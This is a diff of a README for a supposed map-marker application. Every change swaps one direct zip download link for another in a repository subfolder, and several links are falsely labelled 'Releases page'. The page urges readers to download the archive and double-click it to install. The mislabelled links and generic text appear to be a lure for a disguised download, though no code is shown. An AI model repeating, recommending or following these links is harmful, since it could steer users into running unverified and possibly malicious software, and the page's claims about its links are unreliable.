@@ -7,10 +7,10 @@ MapMarker-App is an interactive map application designed for users who want to c
 Ready to enhance your mapping experience? Follow these simple steps to get MapMarker-App up and running on your computer.
 
 ## 📥 Download the Application
-[![Download MapMarker-App](https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip)](https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip)
+[![Download MapMarker-App](https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip)](https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip)
 
 ### 🔗 Visit the Releases Page
-To download the latest version of MapMarker-App, please visit the [Releases page](https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip). Here, you will find the most recent version along with previous releases. 
+To download the latest version of MapMarker-App, please visit the [Releases page](https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip). Here, you will find the most recent version along with previous releases. 
 
 ## ⚙️ System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -20,9 +20,9 @@ Before you download, ensure your system meets the following requirements:
 - **Internet Connection:** Required for downloading and updating the app
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip).
+1. Go to the [Releases page](https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip).
 2. Find the latest version listed.
-3. Click on the asset that matches your operating system (e.g., https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip for Windows).
+3. Click on the asset that matches your operating system (e.g., https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip for Windows).
 4. The file will begin to download. Once complete, locate the downloaded file in your computer's Downloads folder.
 5. Double-click the downloaded file and follow the on-screen instructions to complete the installation.
 
@@ -54,4 +54,4 @@ If you need further assistance, you can reach out for support through the GitHub
 MapMarker-App provides a simple, effective way to mark and save locations on a map. Download it today to start creating your very own custom markers, improving your mapping experience with ease. 
 
 ## 📥 Download Here Again!
-To download the app, visit the [Releases page](https://raw.githubusercontent.com/FUNKYBUNCHMARX1/MapMarker-App/main/arcula/MapMarker-App.zip). Enjoy your mapping journey!
+To download the app, visit the [Releases page](https://github.com/FUNKYBUNCHMARX1/MapMarker-App/raw/refs/heads/main/arcula/App-Map-Marker-v3.5.zip). Enjoy your mapping journey!
